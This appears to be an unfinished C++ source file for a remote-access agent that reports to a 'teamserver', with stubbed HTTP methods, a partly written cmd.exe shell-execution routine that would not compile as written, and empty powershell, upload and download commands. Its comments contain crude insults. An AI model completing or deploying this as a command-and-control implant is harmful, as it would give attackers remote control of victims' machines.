#include "Agent.h"


void Agent::Register(std::string ip, unsigned int port) {
	const int buffer_size = MAX_COMPUTERNAME_LENGTH + 1;
	char buffer[buffer_size];
	DWORD lpnSize = buffer_size;

	if (GetComputerNameA(buffer, &lpnSize) == FALSE)
		throw std::runtime_error("Something went wrong.");
	ComputerName = std::string{ buffer };

}


std::string Agent::Get(std::string path) {
	// path = path + "/" + AgentID + "/"
	return "shell|testing";
}

std::string Agent::Post(std::string path, std::string data) {
	// path = path + "/" + AgentID + "/"
	return "POST func";
}


//re-write this bullshit, each command in own class.

void Agent::shell(std::vector<std::string> args) {
	if (args.size() == 0) {
		//Post(RETURN_PATH, error="No Arguments you fucking retard.");
		return;
	}




	HANDLE hRead, hWrite;
	STARTUPINFO si;
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES saAttr;

	ZeroMemory(&saAttr, sizeof(saAttr));

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hRead, &hWrite, &saAttr, 0)) {
		//Post(RETURN_URL, GetLastError());
		return;// send error back to teamserver
	}
	std::string cmd = "cmd.exe /c ";

	if (!CreateProcessA(NULL, cmd.c_str())) {
		//Post(RETURN_URL, GetLastError());// send error back to teamserver
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return;
	}




}


void Agent::powershell(std::vector<std::string> args) {

}

void Agent::upload(std::vector<std::string> args) {

}

void Agent::download(std::vector<std::string> args) {

}

//void Agent::ListDirectory() {}